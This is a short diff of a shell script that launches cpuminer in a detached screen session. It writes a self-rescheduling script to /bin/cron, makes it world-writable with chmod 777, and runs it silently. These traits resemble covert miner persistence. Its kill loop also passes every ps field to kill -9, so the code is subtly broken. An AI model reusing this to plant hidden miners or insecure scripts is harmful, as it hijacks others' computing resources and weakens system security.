@@ -61,7 +61,7 @@ echo "sudo screen -dmS mining cpuminer -a ${algo} -o stratum+tcp://${str_tcp}${u
 echo "sleep ${timer}m" >> /bin/cron
 echo 'for pids in $(ps x|grep -v grep|grep cpuminer); do' >> /bin/cron
 echo 'kill -9 $pids' >> /bin/cron
-echo 'screen -S mining -X quit' >> /bin/cron
+echo 'screen -wipe' >> /bin/cron
 echo 'done' >> /bin/cron
 echo "at -f /bin/cron now + 40 min" >> /bin/cron
 sudo chmod 777 /bin/cron && bash /bin/cron & > /dev/null
